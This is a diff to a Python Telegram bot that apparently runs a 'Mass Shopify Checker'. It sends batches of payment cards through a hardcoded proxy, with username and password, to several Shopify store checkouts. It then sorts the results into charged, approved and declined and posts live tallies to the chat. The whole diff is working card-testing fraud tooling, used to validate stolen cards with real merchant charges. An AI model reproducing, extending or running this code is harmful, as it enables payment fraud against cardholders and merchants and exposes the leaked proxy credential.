@@ -4779,9 +4779,10 @@ async def check_card_worker(card, base_url, sites, sem, session):
 # --- Mass check runner ---
 async def run_msp(update: Update, cards, base_url, sites, msg):
     approved = declined = errors = checked = 0
-    results = []
+    site_price = None
     gateway_used = "Self Shopify"
-    sem = asyncio.Semaphore(10)  # limit parallel requests
+    results = []
+    sem = asyncio.Semaphore(5)
     lock = asyncio.Lock()
 
     PRIORITY = {
@@ -4802,57 +4803,98 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     }
 
     async with httpx.AsyncClient() as session:
-        tasks = [check_card_worker(card, base_url, sites, sem, session) for card in cards]
-        responses = await asyncio.gather(*tasks)
+        proxy = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"  # Updated proxy
 
-        for idx, card in enumerate(cards):
-            resp, status, price, gateway = responses[idx]
-            gateway_used = gateway or gateway_used
-            resp_upper = resp.upper().replace(" ", "_")
+        async def check_one(card, site):
+            card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
+            card_str = card_str.replace(" ", "")
+            resp, status, price, gateway = await check_card(session, base_url, site, card_str, proxy)
+            resp_str = str(resp).strip()
+            resp_upper = resp_str.upper().replace(" ", "_")
 
-            if any(x in resp_upper for x in ["CHARGED", "THANK_YOU", "SUCCESS", "INSUFFICIENT_FUNDS"]):
-                approved += 1
-                status_icon = "✅"
-                display_resp = f"{escape(resp)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
-            elif any(x in resp_upper for x in ["3D_AUTHENTICATION", "APPROVED"]):
-                approved += 1
-                status_icon = "✅"
-                display_resp = f"{escape(resp)} 🔒"
-            elif any(x in resp_upper for x in ["DECLINED", "CARD_DECLINED"]):
-                declined += 1
-                status_icon = "❌"
-                display_resp = escape(resp)
-            else:
-                errors += 1
-                status_icon = "⚠️"
-                display_resp = escape(resp)
-
-            checked += 1
-            results.append(f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>")
-
-            # Update Telegram live
-            async with lock:
-                summary_text = (
-                    "<pre><code>"
-                    f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🌍 Total Cards : {len(cards)}\n"
-                    f"✅ Approved   : {approved}\n"
-                    f"❌ Declined   : {declined}\n"
-                    f"⚠️ Errors     : {errors}\n"
-                    f"🔄 Checked    : {checked} / {len(cards)}\n"
-                    f"🏬 Gateway    : {gateway_used}\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "</code></pre>\n"
-                    f"#AutoshopifyChecks\n"
-                    f"────────────────\n"
-                )
-                final_text = summary_text + "\n".join(results[-20:])
+            nonlocal site_price, gateway_used
+            if site_price is None:
                 try:
-                    await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)
+                    site_price = float(price)
                 except:
-                    pass
-                await asyncio.sleep(0.05)
+                    site_price = 0.0
+            if gateway and gateway != "N/A":
+                gateway_used = gateway
+
+            # Determine score
+            score = 0
+            for key, val in PRIORITY.items():
+                if key in resp_upper:
+                    score = val
+                    break
+            return resp_str, score
+
+        async def worker(card):
+            nonlocal approved, declined, errors, checked, results
+            async with sem:
+                tasks = [check_one(card, site) for site in sites]
+                responses = await asyncio.gather(*tasks, return_exceptions=True)
+
+                best_resp, best_score = "Unknown", 0
+                for r in responses:
+                    if isinstance(r, Exception):
+                        resp_str, score = f"Error: {r}", 0
+                    else:
+                        resp_str, score = r
+                    if score > best_score:
+                        best_resp, best_score = resp_str, score
+
+                # Skip site if "No valid response" is returned
+                if "No valid response" in best_resp:
+                    errors += 1
+                    status_icon = "⚠️"
+                    display_resp = "No valid response"
+                elif best_score >= 4:
+                    approved += 1
+                    status_icon = "✅"
+                    display_resp = f"{escape(best_resp)} ▸ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+                elif best_score == 3:
+                    approved += 1
+                    status_icon = "✅"
+                    display_resp = f"{escape(best_resp)} 🔒"
+                elif best_score == 2:
+                    declined += 1
+                    status_icon = "❌"
+                    display_resp = escape(best_resp)
+                else:
+                    errors += 1
+                    status_icon = "⚠️"
+                    display_resp = escape(best_resp)
+
+                checked += 1
+                result_line = f"{status_icon} <code>{escape(card)}</code>\n ↳ <i>{display_resp}</i>"
+                results.append(result_line)
+
+                async with lock:
+                    summary_text = (
+                        "<pre><code>"
+                        f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"🌍 Total Cards : {len(cards)}\n"
+                        f"✅ Approved   : {approved}\n"
+                        f"❌ Declined   : {declined}\n"
+                        f"⚠️ Errors     : {errors}\n"
+                        f"🔄 Checked    : {checked} / {len(cards)}\n"
+                        f"🏬 Gateway    : {gateway_used}\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        "</code></pre>\n"
+                        f"#AutoshopifyChecks\n"
+                        f"────────────────\n"
+                    )
+                    final_text = summary_text + "\n".join(results[-20:])
+                    try:
+                        await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)
+                    except:
+                        pass
+                    await asyncio.sleep(0.1)
+
+        for card in cards:
+            await worker(card)
 
 # --- /msp command ---
 async def msp(update: Update, context: "ContextTypes.DEFAULT_TYPE"):
